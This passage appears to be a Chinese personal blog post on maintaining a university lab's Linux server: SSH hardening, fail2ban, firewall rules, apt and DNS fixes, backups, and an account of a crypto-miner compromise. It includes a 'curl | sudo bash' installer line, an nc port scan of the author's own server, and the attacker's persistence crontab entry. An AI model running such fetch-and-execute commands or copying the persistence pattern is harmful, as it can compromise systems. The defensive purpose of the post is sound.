<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzMyOTQ5NTM2NC9hbnN3ZXIvNzE3NTYyOTY4">如何看待电子科技大学副教授郑文锋关于四大发明的争议言论？ - 真实工科肥宅的回答 - 知乎<i class="fa fa-external-link-alt"></i></span>郑老师的学校和论文，郑老师是成理博士百度百科</li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzI5MTUyMTM5MS9hbnN3ZXIvNDc3NDEwMTI0">如何看待美国女权领袖、MeToo 运动发起者被曝性侵男演员后暗中支付巨额封口费？ - 奈芙拉塔的回答 - 知乎<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzQ2NDQ1NjYyL2Fuc3dlci8xMDEzMzc2NDQ=">邵振海事件<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cuemhpaHUuY29tL3F1ZXN0aW9uLzYxOTc2MzUyL2Fuc3dlci8xOTM1NjYyMTI=">张翼德事件<i class="fa fa-external-link-alt"></i></span></li>
<li><span class="exturl" data-url="aHR0cHM6Ly93d3cud2VpYm8uY29tLzM5MTA3MzY0NjcvR2tHZWhyaDdr">宁宁事件<i class="fa fa-external-link-alt"></i></span></li>
<li>河畔帖子（需要账号，这里不放了）</li>
<li>《中国印刷史研究》辛德勇 太长不看版，辛德勇微信公众号文章：<span class="exturl" data-url="aHR0cHM6Ly9tcC53ZWl4aW4ucXEuY29tL3M/X19iaXo9TXpJek16ZzJNVFF3Tnc9PSZhbXA7bWlkPTIyNDc0ODg2MDQmYW1wO2lkeD0xJmFtcDtzbj0zZWQzYTViMWU4ZGYyMjVkN2I3ZTNkZGU1YjY0MDU4ZA==">我看中國古代的活字印刷<i class="fa fa-external-link-alt"></i></span></li>
</ol>
]]></content>
      <categories>
        <category>杂七杂八</category>
      </categories>
  </entry>
  <entry>
    <title>教研室服务器维护</title>
    <url>/d6da/</url>
    <content><![CDATA[<p>教研室要倒闭啦，师兄毕业跑路啦！ <a id="more"></a></p>
<h2 id="写在前面的话">写在前面的话</h2>
<p>top、ls命令并不总是好用，特别是挖矿恶意程序使用rookit等方式隐藏进程、篡改系统命令，会出现CPU跑满但是top命令看不到高占用进程的情况</p>
<p>不想用vim又不得不在linux下改东西，可以不用nano了，这有个<span class="exturl" data-url="aHR0cHM6Ly93bWRwZC5jb20vcWlhbmctbGllLXR1aS1qaWFuLWxpbnV4emhvbmctZHVhbi13ZW4tYmVuLWJpYW4tamktcWktbWljcm8v">micro<i class="fa fa-external-link-alt"></i></span>, 拿好</p>
<p>安装：</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token builtin class-name">cd</span> /usr/bin<span class="token punctuation">;</span> <span class="token function">curl</span> https://getmic.ro <span class="token operator">|</span> <span class="token function">sudo</span> <span class="token function">bash</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="安全问题">安全问题</h2>
<p>教研室的服务器之前就被黑过 老师兄装的Ubuntu，默认端口默认用户名超简单密码直接远程登录，行吧 教研室出现了断层，现在的师兄们（以及并夕夕40万却没用过Linux的师姐）Linux都还没我熟，行吧 服务器以后就扔给我了，行吧</p>
<p>之前折腾Docker的时候看日志发现一堆乱七八糟的</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">grep</span> <span class="token string">"Accepted password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span>
<span class="token function">grep</span> <span class="token string">"Failed password for root"</span> /var/log/auth.log <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'&#123;print <span class="token variable">$11</span>&#125;'</span> <span class="token operator">|</span> <span class="token function">sort</span> <span class="token operator">|</span> <span class="token function">uniq</span> -c <span class="token operator">|</span> <span class="token function">sort</span> -nr <span class="token operator">|</span> <span class="token function">more</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>发现一堆可疑ip几千次登录尝试,哇,又被当小鸡扫了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">3073 Failed
  2593 112.85.42.185
  2471 218.92.0.168
   714 112.85.42.187
   363 218.92.0.188
   261 112.85.42.188
   103 222.186.175.220
   103 222.186.175.148
    86 222.186.180.41
    81 222.186.173.180
    78 222.186.180.8
    78 222.186.180.223
    74 222.186.173.154
    69 222.186.175.161
    65 49.88.112.55
    59 222.186.180.9
    59 222.186.175.182
    57 222.186.180.17
    57 222.186.175.167
    55 222.186.175.202
    55 185.164.72.251
    53 222.186.175.215
    51 222.186.169.194<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>改一下密码和SSH端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sed</span> -i <span class="token string">"s/Port .*/Port 你的端口/g"</span> /etc/ssh/sshd_config<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>安装sshfilter或者flai2ban，这里我用的fail2ban。<a href="#fn1" class="footnote-ref" id="fnref1" role="doc-noteref"><sup>1</sup></a></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt</span> <span class="token function">install</span> fail2ban
<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/fail2ban.conf /etc/fail2ban/fail2ban.local
<span class="token function">sudo</span> <span class="token function">cp</span> /etc/fail2ban/jail.conf /etc/fail2ban/jail.local<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>配置文件修改.local, 会像next.yml一样把.conf文件自动覆盖掉（直接修改那两个conf下次更新可能会覆盖掉）。</p>
<p>主要参数就是那个bantime和maxretry，这里我设成2小时和10次</p>
<p>然后启动</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">systemctl start fail2ban
systemctl <span class="token builtin class-name">enable</span> fail2ban<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>其他操作</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">fail2ban-client <span class="token builtin class-name">set</span> sshd addignoreip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># IP白名单</span>
fail2ban-client <span class="token builtin class-name">set</span> sshd unbanip <span class="token operator">&lt;</span>IP<span class="token operator">></span> <span class="token comment"># 解封IP</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>还要配置一下防火墙 iptables很繁琐，不涉及太多配置的情况下可以用UFW</p>
<h3 id="防火墙端口">防火墙端口</h3>
<p>端口用的时候要打开，不然会出各种烦人的问题，比如wget下载没开443就会<code>443... failed: Connection refused.</code>，如果你加了~--no-check-certificate`还是failed，那八成是防火墙的问题 查看端口开放状态</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>或者</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">telnet <span class="token function">ip</span> port<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>Ubuntu里用ufw查看状态</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw status<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>查看指定端口的状态（没输出可能是没开）</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">netstat</span> -ntlp<span class="token operator">|</span><span class="token function">grep</span> <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>打开443端口</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">iptables -I INPUT -p tcp --dport <span class="token number">443</span> -j ACCEPT
<span class="token function">service</span> iptables save
<span class="token function">service</span> iptables restart<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>使用UFW, 直接</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> ufw allow <span class="token number">443</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>用iptables打开指定端口, 一般开80，443，53，22，其他按需打开</p>
<p>可以安装这个来永久保存配置</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> iptables-persistent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="docker默认修改iptables规则">Docker默认修改iptables规则</h3>
<p>Docker不设置会默认修改iptables规则，将端口暴露在外面，导致端口映射在安全上并没有什么卵用，要设置一下一下，可以看这里 <span class="exturl" data-url="aHR0cHM6Ly93d3cuYmluc3MubWUvYmxvZy9kb2NrZXItcGFzcy10aHJvdWdoLXN5c3RlbS1maXJld2FsbC8=">https://www.binss.me/blog/docker-pass-through-system-firewall/<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="https">HTTPs</h2>
<p>申请SSL证书</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> ssl-cert<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>然后搞一个自己的域名，因为境内服务器要备案，此计划中道崩殂</p>
<h2 id="运行sudo-apt-get-update报错">运行<code>sudo apt-get update</code>报错</h2>
<p>写在前面，我看到有的镜像源示例配置都是走的HTTPS，似乎没有必要 详见<span class="exturl" data-url="aHR0cHM6Ly93aHlkb2VzYXB0bm90dXNlaHR0cHMuY29tLw==">Why does APT not use HTTPS?<i class="fa fa-external-link-alt"></i></span>。 至于某Debian镜像源上说的什么安装apt-transport-https更是没有必要，画蛇添足</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Get:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease [454 B]
Get:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease [454 B]
Get:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease [454 B]
Get:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease [454 B]
Err:1 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:2 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-updates InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:3 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-backports InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)
Err:4 http:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;ubuntu xenial-security InRelease
  Clearsigned file isn&#39;t valid, got &#39;NOSPLIT&#39; (does the network require authentication?)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>查了一下说是代理的问题，看了一下教研室的工作站竟然还有酸酸乳和bbr，一问师兄说是老板外出的时候想上学校网用这个，行吧</p>
<p>设置一下apt的代理</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">&#x2F;etc&#x2F;apt$ cat apt.conf

Acquire::http::proxy &quot;http:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::https::proxy &quot;https:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::ftp::proxy &quot;ftp:&#x2F;&#x2F;&lt;proxy&gt;&quot;;
Acquire::socks::proxy &quot;socks:&lt;proxy&gt;&quot;;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里我切进目录没找到，发现有个apt.conf.d文件夹，是表示缺省的配置文件，删掉换成apt.conf 比如代理是1.2.3.4，端口1234 就改成<code>Acquire::http::proxy "http://1.2.3.4:1234</code></p>
<p>改了一下发现不对，这边是服务端应该没开代理啊</p>
<p>把代理都删了</p>
<p>感觉可能DNS有问题,切到<code>etc/resolv.conf</code>看了一下</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">nameserver 202.112.14.21
nameserver 202.112.14.11<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>这个学校的DNS服务不行啊，别的都直通互联网，这个上不了谷歌不说，还经常不对外网提供解析服务 (能ping通,但是nslookup发现不对外网提供服务) 又看了一下工作站的DNS, 果然换过了 校园网暂时也没什么好的DNS，就先换了清华的 (那个DNS不是<code>/etc/resolv.conf</code>下的，要改<code>/etc/resolvconf/resolv.conf.d</code>下的<code>base</code>文件,第一个只是临时的DNS)</p>
<p>还要刷新一下DNS：<code>sudo service networking restart</code></p>
<p>运行<code>sudo apt-get upgrade</code>又报了这个错<code>Hash Sum mismatch</code></p>
<p>查了一下发现就是阿里云镜像源在教育网下的问题</p>
<p>算了,改镜像源吧,换了清华的</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Err:1 https:&#x2F;&#x2F;mirrors.tuna.tsinghua.edu.cn&#x2F;ubuntu xenial InRelease
  Failed to connect to mirrors.tuna.tsinghua.edu.cn port 443: Connection timed out<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>依然不行, 决定明天重装</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">E: Some index files failed to download. They have been ignored, or old ones used instead.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>看了一下，工作站那台DNS是<code>cat /etc/resolv.conf</code>是127.0.0.1，是DNSmasq托管的，而服务器上的还是你电的DNS，决定改了。 工作站上应该是这样的</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log"># &#x2F;etc&#x2F;network&#x2F;interfaces
dns-nameservers 8.8.8.8<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>改了之后服务器的<code>resolv.conf</code>也是<code>127.0.0.1</code>了 又上大清的网站看了一下，发现居然在维护</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/20191115103425.png" alt="Picture" style="zoom:80%;" /></p>
<p>换成你电的，好了，收工</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ubuntu-apt.png" alt="Picture" style="zoom:80%;" /></p>
<p>又报了<code>Target Translations (main/i18n/Translation-en) is configured multiple times in</code>, 查了一下是指定apt源冲突了，删掉一个就好了</p>
<h2 id="查看配置">查看配置</h2>
<p>本来想用neofetch查看一下服务器的配置，结果apt装不了。 看了一下官方文档发现16.10要这样</p>
<p>Add PPA <code>sudo add-apt-repository ppa:dawidd0811/neofetch</code> Update repositories <code>sudo apt update</code> Install the package <code>sudo apt install neofetch</code> （安装neofetch还能下载编译，可能还快一点）</p>
<p>算了，好慢啊，直接用<code>sudo dmidecode</code>看吧，screenfetch也行 英特尔的e5 2630 v4，20核CPU，没显卡。这CPU平时居然没人用，空跑,居然还有公网ip，我仿佛发现了宝藏。不出意外就留给我挥（bei）霍（guo）了</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">                         .&#x2F;+o+-       root@labserver
                 yyyyy- -yyyyyy+      OS: Ubuntu 16.04 xenial
              :&#x2F;&#x2F;+&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;&#x2F;-yyyyyyo      Kernel: x86_64 Linux 4.12.14-041214-generic
          .++ .:&#x2F;++++++&#x2F;-.+sss&#x2F;&#96;      Uptime: 21h 36m
        .:++o:  &#x2F;++++++++&#x2F;:--:&#x2F;-      Packages: 718
       o:+o+:++.&#96;..&#96;&#96;&#96;.-&#x2F;oo+++++&#x2F;     Shell: bash 4.3.48
      .:+o:+o&#x2F;.          &#96;+sssoo+&#x2F;    WM: Not Found
 .++&#x2F;+:+oo+o:&#96;             &#x2F;sssooo.   CPU: Intel Xeon CPU E5-2630 v4 @ 3.1GHz
&#x2F;+++&#x2F;&#x2F;+:&#96;oo+o               &#x2F;::--:.   RAM: 1348MiB &#x2F; 32074MiB
\+&#x2F;+o+++&#96;o++o               ++&#x2F;&#x2F;&#x2F;&#x2F;.
 .++.o+++oo+:&#96;             &#x2F;dddhhh.
      .+.o+oo:.          &#96;oddhhhh+
       \+.++o+o&#96;&#96;-&#96;&#96;&#96;&#96;.:ohdhhhhh+
        &#96;:o+++ &#96;ohhhhhhhhyo++os:
          .o:&#96;.syhhhhhhh&#x2F;.oo++o&#96;
              &#x2F;osyyyyyyo++ooo+++&#x2F;
                  &#96;&#96;&#96;&#96;&#96; +oo+++o\:
                         &#96;oo++.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h2 id="更新">更新</h2>
<p>发现不是镜像源的问题，是你电的镜像源没安排上https，这个服务器好像是证书的问题，https全都用不了，wget也不行。</p>
<h2 id="滚动升级">滚动升级</h2>
<p>不存在的，这又不是arch系，不要乱升，乱升级滚挂了是要背锅的 要升可以用</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> do-release-upgrade<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>升完记得把apt源给换了 看到有安全更新，说 &gt;<strong><em>System restart required</em></strong></p>
<p>reboot一下就行了</p>
<h2 id="网络问题">网络问题</h2>
<h3 id="网很慢">网很慢</h3>
<p>很迷，有的地方很快，有的地方就几乎慢到断线。我的联通就经常ping不同。 据说老蔡师兄他那里也经常ping不通</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/ping-ubuntu.jpg" alt="Picture" style="zoom:60%;" /></p>
<p>就是网不好。。。而且上行网速更差，有的时候只有100k/s（用的是一个月20块的基础套餐，没加钱）</p>
<pre class="line-numbers language-none"><code class="language-none">Testing download speed..................................
Download: 11.72 Mbyte&#x2F;s
Testing upload speed....................................
Upload: 2.45 Mbyte&#x2F;s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="掉线">掉线</h3>
<p>受疫情影响，全教研室在家连服务器，但是服务器的网络还总掉线 跑一个自动重启网络服务的脚本，直接抄<span class="exturl" data-url="aHR0cDovL3d3dy5saXV4aWFvLm9yZy8yMDE5LzA4L3VidW50dS3kuIvnm5Hmjqflubboh6rliqjph43lkK/nvZHljaEv">这里<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="备份和恢复">备份和恢复</h2>
<p>师兄也没装什么东西，用的cp直接备份了点文件，一言不合重装系统。 先暂时用cp备份一次 挂载一下盘(比如挂到/mnt/mydata)，用cp复制 (挂载看这里<a href="#fn2" class="footnote-ref" id="fnref2" role="doc-noteref"><sup>2</sup></a>)</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">mount</span> /dev/sdb7 /mnt
<span class="token function">nohup</span> <span class="token function">cp</span> -pdr /srv /mnt/mydata <span class="token operator">>></span> logs.out <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">&amp;</span>
<span class="token function">umount</span> /dev/sdb7<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>这样将/srv目录下的文件全部拷贝到mydata下面. 文件很大，cp没有进度条，以后试试gcp之类的命令，先这样吧</p>
<p>看了一下，有接近300G的数据，用cp命令太慢了 用dd，把,整盘拷贝（dd命令不要乱用，一不小心就删库了）</p>
<p>拷贝完<code>umount /mydata</code>再拔</p>
<p>下次试试rsync同步，据说能断点续传和md5验证</p>
<p>更新，发现一款叫clonezilla的软件，使用clonezilla备份非常方便。</p>
<h2 id="使用教研室服务器下载">使用教研室服务器下载</h2>
<p>教研室的服务器有一个单独的猫和ip，网速绝大多数时候不低于50M/s，今天才发现比我的小破工位上的网速快不少。 以后下数据集和数据库文件之类的大东西就用它了！</p>
<h2 id="使用tmux">使用Tmux</h2>
<p>（其实MobaXterm有一个叫Multiexec的功能） 正在备份文件结果网断了（没办法，校园网就是这么....） 这时就要用tmux之类的工具了</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> tmux<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h2 id="图形界面">图形界面</h2>
<p>MobaXterm内嵌有Xserver，可以调出图形化窗口。 比如nedit,Emacs之类的 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/xserver.png" alt="Picture" style="zoom:80%;" /> 已经足够应付简单的图形化界面需求了 完整的桌面需求请直接VNC或teamviewer到工作站操作。</p>
<h2 id="卸载遗留的docker并重装">卸载遗留的Docker并重装</h2>
<p>目前还报这样的错</p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">Cannot connect to the Docker daemon at unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;docker.sock. Is the docker daemon running?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>似乎重装iptables的时候会直接把那个Docker的一部分依赖卸掉 （Docker好像还会直接修改默认的防火墙规则，emmmm)</p>
<p>更新，解决了，是网络问题，离线装就好了</p>
<h2 id="教研室的阿里云">教研室的阿里云</h2>
<p>真的，有毒哇 <img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/apt.png" alt="Picture" style="zoom:80%;" /> 是的，师兄跟我说没有apt。。。<strong>行吧</strong></p>
<p>装一个</p>
<p>等等，不对劲，这是Centos啊</p>
<p><img src="https://raw.githubusercontent.com/Archaeoraptor/image_resources/ImageofBlog/centos.png" alt="Picture" style="zoom:80%;" /></p>
<p>行吧...........那没事了。师兄真的.....我感觉我上了贼船</p>
<h2 id="报备">报备</h2>
<p>按学校信息中心的要求，固定IP都需要申请报备，还有一堆乱七八糟的事</p>
<h3 id="系统日志和杀毒">系统日志和杀毒</h3>
<p>学校信息中心要求备份系统日志和杀软。 然而这Linux有什么装杀软的必要吗？防火墙就完事了。 行吧，交差还是要装模做样的应付一下</p>
<p>安装ClamAV：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> <span class="token function">apt-get</span> <span class="token function">install</span> clamav<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>直接扫描报错了，要升级病毒库<code>sudo freshclam</code></p>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">LibClamAV Error: cli_loaddbdir(): No supported database files found in &#x2F;var&#x2F;lib&#x2F;clamav
ERROR: Can&#39;t open file or directory<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>然后扫一下</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r -i /  <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>系统安装日志，不知道要交什么，索性把apt和dpkg的日志交了,在<code>/var/log/</code>和<code>/var/log/apt/</code>目录下面</p>
<h3 id="端口报备">端口报备</h3>
<p>一般22，80，443，再加上几个常用的端口就够了 实在不行还有端口转发</p>
<p>看一下开了的端口</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nc</span> -znv <span class="token number">211</span>.XXX.XXX.XXX <span class="token number">1</span>-10000  <span class="token operator"><span class="token file-descriptor important">2</span>></span><span class="token file-descriptor important">&amp;1</span> <span class="token operator">|</span> <span class="token function">grep</span> succeeded<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<h3 id="域名">域名</h3>
<p>暂时还没有，备案麻烦没弄</p>
<h2 id="清理trash">清理Trash</h2>
<p>工作站桌面变得非常卡，clamscan扫描home目录也扫了整整两天，看了一下发现有前前任师兄几百个G的数据。使用rm之后跑到了.local文件夹下。使用跑路命令把它们删掉。(最好不要把 .local全删了，只删Trash就行了<code>.local/share/Trash</code>)</p>
<h2 id="其他">其他</h2>
<p>Gitlab占用过高的问题等见瞎折腾记录(其实没有特殊需求可以用Gogs，小声逼逼) 在服务器上部署jupyter参考<span class="exturl" data-url="aHR0cHM6Ly9iaXRtaW5ndy5jb20vMjAxNy8wNy8wOS9ydW4tanVweXRlci1ub3RlYm9vay1zZXJ2ZXIv">搭建 ipython/jupyter notebook 服务器<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="远程开发">远程开发</h2>
<p>为什么要远程呢，因为我的电脑是小破i5，8G内存，装双系统不太行，虚拟机更不行。用wsl真的不如直接上服务器20核CPU、工作站两块1080pi（还有单独的网线和公网IP）。配合SSH端口转发和VSCode、JB全家桶，还是很舒服的。</p>
<h2 id="部署项目">部署项目</h2>
<h3 id="标注工具doccano">标注工具doccano</h3>
<p>这里以开源标注工具doccano为例（该项目提供了Docker镜像和直接部署的方法以及docker-compose示例文件，还给了aws等一键部署脚本）</p>
<p>我们clone下来，修改settings.py文件</p>
<p>最简单的方法就是直接上docker</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">$ <span class="token function">git</span> clone https://github.com/doccano/doccano.git
$ <span class="token builtin class-name">cd</span> doccano
$ docker-compose -f docker-compose.prod.yml up<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>docker打包通常会很大，动不动就上G了，一些轻量且不至于弄坏系统环境的东西建议还是裸跑</p>
<h2 id="一次被黑记录">一次被黑记录</h2>
<pre class="line-numbers language-log" data-language="log"><code class="language-log">CPU  [||||||||||||||||                 51.8%]   CPU -    51.8%  nice:     0.0%  ctx_sw:    8K   MEM -   21.7%  active:    5.31G   SWAP -    0.0%   LOAD    20-core
MEM  [|||||||                          21.7%]   user:    51.3%  irq:      0.0%  inter:   5508   total:  31.3G  inactive:  4.27G   total:    976M  
····
lo                         0b     0b   999.5  0.0   2.34G 2.44M   2654 root        67h8:58 16    0 S    ? ?    .&#x2F;cron
2020-01-15 16:17:54 CST<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>症状：昨天（2020.1.14）root上不去了，rsa密钥也挂了，以为是网的问题，今天一试还不行。用自己的另一个账号登了一下，发现<code>su root</code>居然permission denied了。怀疑是被黑了，一看系统占用，有挖矿程序在跑，而且网络带宽占用也很高，怀疑是被当成肉鸡对外攻击了。看了一下系统日志，是一月13号被黑的，照着网上清了一遍。从此禁用密码登录（之前就想禁，师兄嫌麻烦）。MySQL也禁用密码改ssl</p>
<p>clamav再扫一遍</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">nohup</span> clamscan -r /root <span class="token number">2</span> <span class="token operator">>></span> err.out <span class="token operator">&amp;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>更新：</p>
<p>之前没清干净，貌似又被黑了</p>
<p>症状，运行<code>apt update</code>的时候</p>
<pre class="line-numbers language-none"><code class="language-none">Errors were encountered while processing:
 clamav-freshclam
 clamav
E: Sub-process &#x2F;usr&#x2F;bin&#x2F;dpkg returned an error code (1)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>然而运行了一下freshclam</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">root@xi102:~<span class="token comment"># freshclam</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> ClamAV update process started at Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> daily.cld database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">25743</span>, sigs: <span class="token number">2209759</span>, f-level: <span class="token number">63</span>, builder: raynman<span class="token punctuation">)</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> main.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">59</span>, sigs: <span class="token number">4564902</span>, f-level: <span class="token number">60</span>, builder: sigmgr<span class="token punctuation">)</span>
Sat Mar  <span class="token number">7</span> <span class="token number">16</span>:49:25 <span class="token number">2020</span> -<span class="token operator">></span> bytecode.cvd database is up to <span class="token function">date</span> <span class="token punctuation">(</span>version: <span class="token number">331</span>, sigs: <span class="token number">94</span>, f-level: <span class="token number">63</span>, builder: anvilleg<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>居然显示病毒库是最新的</p>
<p>可疑进程 /opt/atlassian/confluence/jre//bin/java -Djava.ut</p>
<p>然后看了一下有没有可疑的定时任务</p>
<pre class="line-numbers language-none"><code class="language-none">root@xi102:~# crontab -l
0 0 *&#x2F;3 * * &#x2F;root&#x2F;.bashtemp&#x2F;a&#x2F;upd&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1
